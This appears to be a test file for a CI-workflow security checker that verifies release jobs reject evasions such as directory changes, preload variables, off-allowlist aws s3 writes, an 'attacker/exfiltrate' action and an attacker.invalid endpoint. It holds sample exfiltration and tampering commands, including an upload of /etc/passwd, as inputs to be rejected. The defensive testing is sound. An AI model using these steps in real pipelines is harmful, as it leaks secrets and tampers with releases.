	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("holds 'contents: write'")), problems.join("\n"));
	broken = mutate(STANDALONE, (text) => text.replace("      contents: read\n      id-token: write\n", "      contents: read\n      id-token: write\n      attestations: write\n"));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("holds 'attestations: write'")), problems.join("\n"));
	broken = mutate(STANDALONE, (text) => text.replace("    env:\n      # A pull request from a fork", "    environment: release-r2\n    env:\n      # A pull request from a fork"));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("must not run in an environment")), problems.join("\n"));
	broken = mutate(STANDALONE, (text) => text.replace("      TARGET_PLATFORM: ${{ matrix.platform }}\n", "      TARGET_PLATFORM: ${{ matrix.platform }}\n      R2: ${{ secrets.R2_BUCKET }}\n"));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("references a secret")), problems.join("\n"));
	broken = mutate(RELEASE, (text) => text.replace("    permissions:\n      contents: read\n      id-token: write\n    uses: ./.github/workflows/standalone-binaries.yml", "    permissions:\n      contents: write\n      id-token: write\n    uses: ./.github/workflows/standalone-binaries.yml"));
	problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("job 'standalone'") && problem.includes("must pass exactly contents: read and id-token: write")), problems.join("\n"));
});

// Round 3, finding A: `cd scripts; bash publish` and friends. A directory change in a
// credential-bearing job may only target a downloaded artifact directory, and whatever runs
// afterwards is resolved against where it really runs.
const DIRECTORY_EVASIONS = [
	["cd then a bare interpreter argument", "cd scripts; bash publish", /changes directory outside the downloaded artifacts .*cd scripts/],
	["cd then a bare name resolved against the new directory", "cd scripts; cat publish", /publish resolves to scripts\/publish from working directory scripts/],
	["cd to $GITHUB_WORKSPACE", 'cd "$GITHUB_WORKSPACE" && bash x', /changes directory to a target the checker cannot resolve: cd \$GITHUB_WORKSPACE/],
	["pushd", "pushd scripts", /changes directory outside the downloaded artifacts .*pushd scripts/],
	["a subshell", "(cd scripts && ./publish)", /changes directory outside the downloaded artifacts .*cd scripts/],
	["popd", "popd", /changes directory in a way the checker cannot follow: popd/],
	["cd with no target (HOME)", "cd", /changes directory to a target the checker cannot resolve: cd/],
	["cd -", "cd -", /changes directory to a target the checker cannot resolve: cd -/],
	["cd ..", "cd artifacts && cd ..", /changes directory outside the downloaded artifacts .*cd \.\./],
	["a traversal through an artifact directory", "cd artifacts/../scripts", /changes directory outside the downloaded artifacts .*cd artifacts\/\.\.\/scripts/],
	["a subshell cd that leaks a bare name", "cd scripts; (cat x)", /x resolves to scripts\/x/],
	["PATH pointing at the working directory", "PATH=.:$PATH publish", /modifies PATH/],
	["export PATH", "export PATH=/tmp:$PATH", /modifies PATH/],
	["an alias for aws", "shopt -s expand_aliases; alias aws='curl -X PUT'", /shopt changes how commands resolve/],
	["a trap running code", "trap 'node publish' EXIT", /trap changes how commands resolve or run/],
	["hash -p", "hash -p ./publish aws", /hash changes how commands resolve/],
];

test("a directory change is tracked across segments and is only allowed into a downloaded artifact directory (round 3, finding A)", () => {
	const options = { artifactDirectories: ["artifacts", "manifest"] };
	for (const [label, script, pattern] of DIRECTORY_EVASIONS) {
		const reasons = credentialStepReasons(script, options);
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	// The directory change is scoped to a subshell.
	assert.deepEqual(credentialStepReasons("(cd artifacts && cat SHA256SUMS); cat foo", options), []);
	assert.deepEqual(credentialStepReasons("(cd artifacts && sha256sum --check SHA256SUMS)", options), []);
	assert.deepEqual(credentialStepReasons("cd artifacts && cat SHA256SUMS", options), []);
	assert.deepEqual(credentialStepReasons("cd manifest/sub && cat x", options), []);
	assert.deepEqual(credentialStepReasons("cd -P artifacts && cat SHA256SUMS", options), []);
	// Without any downloaded artifact there is nowhere to go.
	assert.match(credentialStepReasons("cd artifacts", { artifactDirectories: [] }).join("\n"), /changes directory outside the downloaded artifacts \(none\)/);
	// A step working-directory in an artifact directory is the starting point.
	assert.deepEqual(credentialStepReasons("cat SHA256SUMS", { ...options, workingDirectory: "artifacts" }), []);
	assert.match(credentialStepReasons("cat ../scripts/x", { ...options, workingDirectory: "artifacts" }).join("\n"), /references the checkout/);
	// The word splitter records the parentheses around a command.
	assert.deepEqual(splitWords("(cd a && b); c").commands.map((command) => [command.opens, command.closes]), [[1, 0], [0, 1], [0, 0]]);
	assert.deepEqual(splitWords("a; b && c || d | e & f").commands.map((command) => command.words.map((word) => word.text)), [["a"], ["b"], ["c"], ["d"], ["e"], ["f"]]);
});

for (const jobId of ["publish-r2", "finalize-release", "publish-npm", "tap-bump", "github-release"]) {
	test(`a directory change inside credential-bearing job ${jobId} is rejected in the workflow (round 3, finding A)`, () => {
		for (const [label, script, pattern] of DIRECTORY_EVASIONS) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in a cd", `set -euo pipefail\n${script}`)));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(
				problems.some((problem) => problem.includes(`'${jobId}'`) && pattern.test(problem)),
				`${label} in ${jobId}: expected ${pattern}, got:\n${problems.join("\n")}`,
			);
		}
		// `working-directory:` on a step is the same evasion without a `cd`.
		for (const directory of ["scripts", ".", "..", "${{ github.workspace }}", "/tmp", "artifacts/../packages"]) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, `      - name: Sneak in a working directory\n        working-directory: '${directory}'\n        run: bash publish\n`));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(
				problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes("working directory other than a downloaded artifact directory")),
				`working-directory: ${directory} in ${jobId}:\n${problems.join("\n")}`,
			);
		}
		// A job-level default working directory or a non-bash shell is the same evasion again.
		const defaults = mutate(RELEASE, (text) => text.replace(`\n  ${jobId}:\n`, `\n  ${jobId}:\n    defaults:\n      run:\n        working-directory: scripts\n`));
		assert.ok(checkWorkflows(reader({ [RELEASE]: defaults })).some((problem) => problem.includes(`'${jobId}'`) && problem.includes("working directory other than a downloaded artifact directory")));
		for (const shell of ["python", "node {0}", "pwsh"]) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, `      - name: Sneak in another language\n        shell: '${shell}'\n        run: print(1)\n`));
			assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes(`'${jobId}'`) && problem.includes("must run bash")), `shell: ${shell} in ${jobId}`);
		}
		// An environment variable that loads code before the first command is the same evasion without any command.
		for (const [name, value] of [["BASH_ENV", "scripts/env.sh"], ["NODE_OPTIONS", "--require ./scripts/x.js"], ["PATH", "scripts:/usr/bin"], ["LD_PRELOAD", "/tmp/x.so"]]) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, `      - name: Preload\n        env:\n          ${name}: '${value}'\n        run: echo hi\n`));
			assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes(`'${jobId}'`) && problem.includes(`sets ${name}`)), `${name} in ${jobId}`);
		}
	});
}

test("a downloaded artifact directory is the one place a credential-bearing step may work in (round 3, finding A)", () => {
	const release = parse(readFileSync(RELEASE, "utf8"));
	assert.deepEqual(artifactDirectoriesOf(release.jobs["publish-r2"]), ["artifacts", "artifacts", "manifest"]);
	assert.deepEqual(artifactDirectoriesOf(release.jobs["publish-npm"]), ["npm-packages"]);
	assert.deepEqual(artifactDirectoriesOf({ steps: [{ uses: "actions/download-artifact@abc", with: { name: "x", path: "${{ runner.temp }}/x" } }] }), []);
	// publish-beta-r2 legitimately cds into artifacts inside a subshell.
	const beta = release.jobs["publish-beta-r2"].steps.find((step) => step.name === "Refuse anything that is not a beta artifact");
	assert.match(beta.run, /\(cd artifacts && sha256sum --check SHA256SUMS\)/);
	assert.deepEqual(checkWorkflows(), []);
	const fine = mutate(RELEASE, (text) => appendStep(text, "publish-r2", "      - name: Work inside the artifacts\n        working-directory: artifacts\n        run: sha256sum --check SHA256SUMS\n"));
	assert.deepEqual(checkWorkflows(reader({ [RELEASE]: fine })), []);
});

// Round 3, finding B: the pointer guard is an allowlist over every aws invocation, not a
// denylist over the literal words `stable` and `latest.json`.
const R2_EVASIONS = [
	["a variable key", 'key=stable; aws s3 cp artifacts/stable "s3://${R2_BUCKET}/${key}"', /destination is outside the allowlist/],
	["a variable bucket and key", 'B="$R2_BUCKET"; key=stable; aws s3 cp x "s3://$B/$key"', /destination must be spelled s3:\/\/\$\{R2_BUCKET\}\/<key>/],
	["another bucket", 'aws s3 cp artifacts/stable "s3://$OTHER_BUCKET/stable"', /destination must be spelled/],
	["an unbraced bucket", 'aws s3 cp artifacts/stable "s3://$R2_BUCKET/releases/v${PRODUCTION_VERSION}/stable"', /destination must be spelled/],
	["aws s3 sync", 'aws s3 sync artifacts/ "s3://${R2_BUCKET}/"', /aws s3 sync is not allowed/],
	["aws s3 mv", 'aws s3 mv artifacts/stable "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /aws s3 mv is not allowed/],
	["aws s3 rm", 'aws s3 rm "s3://${R2_BUCKET}/stable"', /aws s3 rm is not allowed/],
	["aws s3api put-object", 'aws s3api put-object --bucket "$R2_BUCKET" --key stable --body artifacts/stable', /aws s3api put-object writes/],
	["aws s3api copy-object", 'aws s3api copy-object --bucket "$R2_BUCKET" --key stable --copy-source "$R2_BUCKET/releases/v${PRODUCTION_VERSION}/stable"', /aws s3api copy-object writes/],
	["--recursive to the bucket root", 'aws s3 cp artifacts "s3://${R2_BUCKET}/" --recursive', /option the checker does not allow: --recursive/],
	["--recursive into the releases prefix", 'aws s3 cp artifacts "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/" --recursive', /option the checker does not allow: --recursive/],
	["an --option=value the checker does not parse", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url="$R2_ENDPOINT_URL"', /option the checker does not allow/],
	["a command substitution as the object name", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/$(basename artifacts/x)"', /never another expansion/],
	["${name} bound by another loop", 'for name in stable latest.json; do aws s3 cp "artifacts/$name" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done', /uses \$\{name\} where it is not the basename/],
	["${name} bound from another directory", 'for file in /etc/*; do name=$(basename "$file"); aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done', /uses \$\{name\} where it is not the basename/],
	["${name} rebound after the loop head", 'for file in artifacts/*; do name=$(basename "$file"); name=stable; aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done', /uses \$\{name\} where it is not the basename/],
	["${name} rebound by read", 'for file in artifacts/*; do name=$(basename "$file"); read -r name < /tmp/x; aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done', /uses \$\{name\} where it is not the basename/],
	["$file rebound", 'for file in artifacts/*; do name=$(basename "$file"); file=/etc/passwd; aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done', /uploads something other than a downloaded artifact/],
	["a source outside the artifacts", 'aws s3 cp /etc/passwd "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/passwd"', /uploads something other than a downloaded artifact/],
	["a reassigned version", 'PRODUCTION_VERSION=0.0.0; aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /reassigns PRODUCTION_VERSION/],
	["a reassigned bucket", 'export R2_BUCKET=other; aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /reassigns R2_BUCKET/],
	["a bucket read into a variable", 'read -r R2_BUCKET < /tmp/x', /reassigns R2_BUCKET/],
	["aws through a path", '/usr/local/bin/aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /through a path or expansion/],
	["aws inside a command substitution", 'out=$(aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable")', /inside a command substitution: .*production pointer/],
	["a service that is not s3", "aws sts get-caller-identity", /aws sts is not an R2 object operation/],
	["a function that shadows aws", 'aws() { command aws "$@"; }', /aws must name a literal service and operation/],
	["an expanded operation", 'op=cp; aws s3 "$op" artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /aws must name a literal service and operation/],
	["a pointer in publish-r2", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable"', /only 'finalize-release' may write a production pointer/],
	["latest.json in publish-r2", 'aws s3 cp artifacts/latest.json "s3://${R2_BUCKET}/latest.json"', /only 'finalize-release' may write a production pointer/],
	["a prefix that is not releases/", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/v${PRODUCTION_VERSION}/x"', /destination is outside the allowlist/],
	["a beta prefix in the production job", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${BETA_VERSION}/x"', /destination is outside the allowlist/],
	["a nested object path", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/../stable"', /must be a literal or \$\{name\}/],
	["three positionals", 'aws s3 cp artifacts/x artifacts/y "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /exactly one source and one destination/],
];

test("every aws destination in a publish job must be spelled out against the allowlist (round 3, finding B)", () => {
	const options = { artifactDirectories: ["artifacts", "manifest"] };
	for (const [label, script, pattern] of R2_EVASIONS) {
		const { reasons } = r2StepReasons("publish-r2", script, options);
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	// What the checked-in jobs do is accepted, one construct at a time.
	const fine = (jobId, script, last = false) => {
		const { reasons } = r2StepReasons(jobId, script, { ...options, last });
		assert.deepEqual(reasons, [], `${jobId}: ${script}`);
	};
	// Every invocation carries --endpoint-url "$R2_ENDPOINT_URL" (round 5, finding 2).
	const E = '--endpoint-url "$R2_ENDPOINT_URL"';
	fine("publish-r2", `for file in artifacts/*; do\n  name=$(basename "$file")\n  aws s3 cp "$file" "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/\${name}" ${E} --content-type "$(content_type "$name")" --cache-control 'public, max-age=31536000, immutable' --quiet\ndone`);
	fine("publish-r2", `for file in artifacts/*; do name=$(basename "$file"); aws s3 cp "$file" "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/\${name}" ${E}; done`);
	fine("publish-r2", `aws s3 cp artifacts/SHA256SUMS "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/SHA256SUMS" ${E} --quiet`);
	fine("publish-r2", `aws s3 cp artifacts/SHA256SUMS "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/SHA256SUMS" --endpoint-url "\${R2_ENDPOINT_URL}" --region auto --quiet`);
	fine("publish-r2", `aws s3 cp artifacts/SHA256SUMS "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/SHA256SUMS" ${E} --region "$AWS_DEFAULT_REGION" --quiet`);
	fine("publish-r2", `aws s3 cp "s3://\${R2_BUCKET}/\${key}" /tmp/readback.bin ${E} --quiet`);
	fine("publish-r2", `aws s3api head-object --bucket "$R2_BUCKET" --key "$key" ${E} >/tmp/head.json 2>/dev/null`);
	fine("publish-r2", `aws s3 ls "s3://\${R2_BUCKET}/releases/" ${E}`);
	fine("publish-beta-r2", `for file in artifacts/*; do name=$(basename "$file"); aws s3 cp "$file" "s3://\${R2_BUCKET}/releases/v\${BETA_VERSION}/\${name}" ${E}; done`);
	fine("publish-beta-r2", `aws s3 cp artifacts/beta "s3://\${R2_BUCKET}/beta" ${E} --quiet\naws s3 cp artifacts/beta.json "s3://\${R2_BUCKET}/beta.json" ${E} --quiet`, true);
	for (const pointer of PRODUCTION_POINTERS) fine("finalize-release", `aws s3 cp artifacts/${pointer} "s3://\${R2_BUCKET}/${pointer}" ${E} --cache-control no-cache --quiet`, true);
	// The pointer keys fall out of the walk.
	assert.deepEqual(r2StepReasons("finalize-release", `aws s3 cp artifacts/stable "s3://\${R2_BUCKET}/stable" ${E}\naws s3 cp artifacts/latest.json "s3://\${R2_BUCKET}/latest.json" ${E}`, { ...options, last: true }).pointers, ["stable", "latest.json"]);
	// ...and never in an earlier step.
	assert.match(r2StepReasons("finalize-release", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable"', options).reasons.join("\n"), /in its last step; 'stable' is written earlier/);
	assert.match(r2StepReasons("publish-beta-r2", 'aws s3 cp artifacts/beta "s3://${R2_BUCKET}/beta"', options).reasons.join("\n"), /in its last step; 'beta' is written earlier/);
	// The beta job may never write a production pointer, and finalize never writes into releases/.
	assert.match(r2StepReasons("publish-beta-r2", 'aws s3 cp artifacts/install.sh "s3://${R2_BUCKET}/install.sh"', { ...options, last: true }).reasons.join("\n"), /beta channel must never write a production pointer/);
	assert.match(r2StepReasons("finalize-release", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/stable"', { ...options, last: true }).reasons.join("\n"), /outside the allowlist for 'finalize-release'/);
	// No other job may talk to R2 at all.
	for (const jobId of ["github-release", "build", "assemble", "verify", "publish-npm", "tap-bump"]) {
		assert.equal(jobId in R2_WRITERS, false);
		assert.match(r2StepReasons(jobId, 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', options).reasons.join("\n"), /invokes the aws CLI; only publish-r2, publish-beta-r2, finalize-release/);
		assert.match(r2StepReasons(jobId, 'aws s3api head-object --bucket b --key k', options).reasons.join("\n"), /invokes the aws CLI/);
	}
});

for (const jobId of ["publish-r2", "publish-beta-r2", "finalize-release"]) {
	test(`an aws write outside the allowlist inside ${jobId} is rejected in the workflow (round 3, finding B)`, () => {
		for (const [label, script, pattern] of R2_EVASIONS) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in a write", `set -euo pipefail\n${script}`)));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			// The generic messages differ per job (beta / finalize word their pointer refusals differently); every evasion must produce SOME aws finding for the job.
			assert.ok(
				problems.some((problem) => problem.includes(`'${jobId}'`) && (pattern.test(problem) || /aws|production pointer|reassigns/.test(problem))),
				`${label} in ${jobId}: got:\n${problems.join("\n")}`,
			);
			if (jobId === "publish-r2") assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && pattern.test(problem)), `${label} in ${jobId}: expected ${pattern}, got:\n${problems.join("\n")}`);
		}
	});
}

test("the R2 destination variables can only come from the secret and the context output (round 3, finding B)", () => {
	for (const [jobId, name, value] of [
		["publish-r2", "R2_BUCKET", "attacker-bucket"],
		["publish-r2", "PRODUCTION_VERSION", "0.0.0"],
		["publish-r2", "PRODUCTION_VERSION", "${{ github.event.inputs.version }}"],
		["publish-beta-r2", "BETA_VERSION", "${{ needs.context.outputs.production_version }}"],
		["finalize-release", "R2_ENDPOINT_URL", "https://attacker.invalid"],
	]) {
		const broken = mutate(RELEASE, (text) => appendStep(text, jobId, `      - name: Redirect the destination\n        env:\n          ${name}: '${value}'\n        run: echo hi\n`));
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes(`sets ${name} to`)), `${jobId} ${name}=${value}:\n${problems.join("\n")}`);
	}
	// The job-level version is checked too.
	const jobLevel = mutate(RELEASE, (text) =>
		text.replace(
			"    env:\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n    steps:\n      # No checkout, no dependency install",
			"    env:\n      PRODUCTION_VERSION: ${{ github.event.inputs.version }}\n    steps:\n      # No checkout, no dependency install",
		),
	);
	assert.ok(checkWorkflows(reader({ [RELEASE]: jobLevel })).some((problem) => problem.includes("'publish-r2' job sets PRODUCTION_VERSION")));
});

test("aws anywhere outside the three R2 jobs is rejected in the workflow (round 3, finding B)", () => {
	for (const jobId of ["github-release", "build", "assemble", "publish-npm", "tap-bump", "verify"]) {
		const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in aws", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"')));
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes("invokes the aws CLI")), `${jobId}:\n${problems.join("\n")}`);
	}
});

test("the checked-in publish steps spell out every destination (round 3, finding B)", () => {
	const release = parse(readFileSync(RELEASE, "utf8"));
	const upload = release.jobs["publish-r2"].steps.find((step) => step.name === "Upload immutable release objects");
	assert.match(upload.run, /aws s3 cp "\$file" "s3:\/\/\$\{R2_BUCKET\}\/releases\/v\$\{PRODUCTION_VERSION\}\/\$\{name\}"/);
	const beta = release.jobs["publish-beta-r2"].steps.find((step) => step.name === "Upload immutable beta objects");
	assert.match(beta.run, /aws s3 cp "\$file" "s3:\/\/\$\{R2_BUCKET\}\/releases\/v\$\{BETA_VERSION\}\/\$\{name\}"/);
	const pointers = release.jobs["finalize-release"].steps.at(-1);
	for (const pointer of PRODUCTION_POINTERS) assert.ok(pointers.run.includes(`aws s3 cp artifacts/${pointer} "s3://\${R2_BUCKET}/${pointer}"`), pointer);
	// The only `${key}` left is the read-back download; no upload destination is built from a variable.
	assert.deepEqual(pointers.run.split("\n").filter((line) => line.includes("${key}")), ['  aws s3 cp "s3://${R2_BUCKET}/${key}" /tmp/pointer.bin --endpoint-url "$R2_ENDPOINT_URL" --quiet', '  echo "pointer ${key}"']);
});

// ---------------------------------------------------------------------------------------------
// Round 4: allowlists everywhere a credential is present, and the evasions the reviewer found.
// ---------------------------------------------------------------------------------------------

const SHA = "0000000000000000000000000000000000000000";
const usesStep = (uses, name = "Sneak in an action") => `      - name: ${name}\n        uses: ${uses}\n`;

test("credential-bearing jobs accept only allowlisted actions, never an arbitrary pinned one (round 4, finding 1 - critical)", () => {
	// The reviewer's case: a SHA-pinned third-party action that is not on any denylist.
	let broken = mutate(RELEASE, (text) => appendStep(text, "finalize-release", usesStep(`attacker/exfiltrate@${SHA}`)));
	let problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("'finalize-release'") && problem.includes(`attacker/exfiltrate@${SHA}`) && problem.includes("must not use")), problems.join("\n"));
	// Every credential-bearing job, including the ones that are only credential-bearing through a token or OIDC.
	for (const jobId of ["publish-r2", "publish-beta-r2", "publish-npm", "tap-bump", "github-release", "github-release-beta", "sign"]) {
		for (const uses of [`attacker/exfiltrate@${SHA}`, `actions/github-script@${SHA}`, `actions/cache@${SHA}`, `docker/login-action@${SHA}`, `actions/checkout@${SHA}`]) {
			broken = mutate(RELEASE, (text) => appendStep(text, jobId, usesStep(uses)));
			problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes(uses)), `${uses} in ${jobId}:\n${problems.join("\n")}`);
		}
	}
	// An action allowed for one job is not allowed for another.
	broken = mutate(RELEASE, (text) => appendStep(text, "finalize-release", usesStep(`sigstore/cosign-installer@${SHA}`)));
	assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes("'finalize-release'") && problem.includes("cosign-installer")));
	broken = mutate(RELEASE, (text) => appendStep(text, "sign", usesStep(`actions/setup-node@${SHA}`)));
	assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes("'sign'") && problem.includes("setup-node")));
	// The allowlist is exactly what the checked-in jobs use; github-script is not on it.
	assert.equal(JSON.stringify(ALLOWED_ACTIONS).includes("github-script"), false);
	const release = parse(readFileSync(RELEASE, "utf8"));
	for (const [jobId, job] of Object.entries(release.jobs)) {
		if (!isCredentialBearing(job)) continue;
		const allowed = [...ALLOWED_ACTIONS["*"], ...(ALLOWED_ACTIONS[jobId] ?? [])];
		for (const step of job.steps ?? []) {
			if (step.uses) assert.ok(allowed.some((pattern) => pattern.test(step.uses)), `${jobId} uses ${step.uses}`);
		}
	}
	assert.deepEqual(checkWorkflows(), []);
});

test("scalar permissions are read as grants, not iterated as characters (round 4, finding 2)", () => {
	assert.deepEqual(permissionEntries("write-all"), [["*", "write"]]);
	assert.deepEqual(permissionEntries("read-all"), [["*", "read"]]);
	assert.deepEqual(permissionEntries({ contents: "write" }), [["contents", "write"]]);
	assert.deepEqual(permissionEntries(undefined), []);
	assert.equal(isCredentialBearing({ permissions: "write-all", steps: [] }), true);
	assert.equal(isCredentialBearing({ permissions: "read-all", steps: [] }), false);
	assert.equal(isCredentialBearing({ permissions: { contents: "read", "id-token": "write" }, steps: [] }), true);
	// `build` checks the repository out; with write-all it is credential-bearing and the checkout is a violation.
	const broken = mutate(RELEASE, (text) => text.replace("  build:\n    name: Pack release\n    runs-on: ubuntu-latest\n    needs: [context, standalone]\n    permissions:\n      contents: read\n", "  build:\n    name: Pack release\n    runs-on: ubuntu-latest\n    needs: [context, standalone]\n    permissions: write-all\n"));
	assert.equal(isCredentialBearing(parse(broken).jobs.build), true);
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("'build'") && problem.includes("actions/checkout")), problems.join("\n"));
	assert.ok(problems.some((problem) => problem.includes("'build'") && problem.includes("permissions: write-all")), problems.join("\n"));
	// read-all is a blanket grant too; every scope is spelled out.
	const readAll = mutate(RELEASE, (text) => text.replace("  build:\n    name: Pack release\n    runs-on: ubuntu-latest\n    needs: [context, standalone]\n    permissions:\n      contents: read\n", "  build:\n    name: Pack release\n    runs-on: ubuntu-latest\n    needs: [context, standalone]\n    permissions: read-all\n"));
	assert.ok(checkWorkflows(reader({ [RELEASE]: readAll })).some((problem) => problem.includes("'build'") && problem.includes("permissions: read-all")));
	// The standalone job and its callers refuse a scalar as well.
	const standalone = mutate(STANDALONE, (text) => text.replace("      contents: read\n      id-token: write\n", "").replace("    permissions:\n", "    permissions: write-all\n"));
	assert.ok(checkWorkflows(reader({ [STANDALONE]: standalone })).some((problem) => problem.includes("permissions: write-all")));
	const caller = mutate(RELEASE, (text) => text.replace("    permissions:\n      contents: read\n      id-token: write\n    uses: ./.github/workflows/standalone-binaries.yml", "    permissions: write-all\n    uses: ./.github/workflows/standalone-binaries.yml"));
	assert.ok(checkWorkflows(reader({ [RELEASE]: caller })).some((problem) => problem.includes("job 'standalone'") && problem.includes("must pass exactly")));
});

test("a workflow-level env or default that carries a secret or a preload variable is rejected (round 4, finding 3)", () => {
	const workflowLevel = (yaml) => mutate(RELEASE, (text) => text.replace("permissions: {}\n\njobs:\n", `permissions: {}\n${yaml}\njobs:\n`));
	let problems = checkWorkflows(reader({ [RELEASE]: workflowLevel("env:\n  AWS_SECRET_ACCESS_KEY: ${{ secrets.R2_SECRET_ACCESS_KEY }}\n") }));
	assert.ok(problems.some((problem) => problem.includes("workflow-level env AWS_SECRET_ACCESS_KEY references a secret")), problems.join("\n"));
	problems = checkWorkflows(reader({ [RELEASE]: workflowLevel("env:\n  TOKENS: ${{ secrets.GITHUB_TOKEN }} ${{ secrets.HOMEBREW_TAP_TOKEN }}\n") }));
	assert.ok(problems.some((problem) => problem.includes("workflow-level env TOKENS references a secret")), problems.join("\n"));
	problems = checkWorkflows(reader({ [RELEASE]: workflowLevel("env:\n  NODE_OPTIONS: --require ./x.js\n") }));
	assert.ok(problems.some((problem) => problem.includes("workflow-level env sets NODE_OPTIONS")), problems.join("\n"));
	problems = checkWorkflows(reader({ [RELEASE]: workflowLevel("defaults:\n  run:\n    working-directory: ${{ secrets.WORKDIR }}\n") }));
	assert.ok(problems.some((problem) => problem.includes("workflow-level defaults reference a secret")), problems.join("\n"));
	// GITHUB_TOKEN alone at the workflow level is not a secret reference (it is checked per job as a permission).
	problems = checkWorkflows(reader({ [RELEASE]: workflowLevel("env:\n  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n") }));
	assert.equal(problems.some((problem) => problem.includes("workflow-level env")), false, problems.join("\n"));
});

test("no job or step in the release may run after an upstream failure through a status function (round 4, finding 4)", () => {
	const release = parse(readFileSync(RELEASE, "utf8"));
	// `!cancelled()` has to be wrapped in `${{ }}`: a bare `!` starts a YAML tag, which is why GitHub documents it that way.
	const conditions = ["always()", "${{ !cancelled() }}", "failure()", "success() || failure()", "always() && needs.verify.result != 'skipped'", "${{ always() }}", "cancelled() == false"];
	for (const jobId of ["github-release", "publish-r2", "verify", "finalize-release", "pack-npm", "publish-npm", "tap-bump", "publish-beta-r2", "github-release-beta", "sign"]) {
		assert.ok(release.jobs[jobId].if, `${jobId} has an if`);
		for (const condition of conditions) {
			const broken = mutate(RELEASE, (text) => {
				const start = text.indexOf(`\n  ${jobId}:\n`);
				const folded = text.indexOf("    if: >-\n", start);
				const single = text.indexOf("    if: github.event_name", start);
				const nextJob = text.indexOf("\n  ", text.indexOf("    runs-on:", start));
				if (folded !== -1 && folded < nextJob && (single === -1 || folded < single)) {
					return `${text.slice(0, folded)}    if: >-\n      ${condition} &&\n${text.slice(folded + "    if: >-\n".length)}`;
				}
				assert.ok(single !== -1 && single < nextJob, `${jobId} has a single-line if`);
				return `${text.slice(0, single)}    if: ${condition} && ${text.slice(single + "    if: ".length)}`;
			});
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(problems.some((problem) => problem.includes(`job '${jobId}'`) && problem.includes("status-check function")), `${condition} on ${jobId}:\n${problems.join("\n")}`);
		}
	}
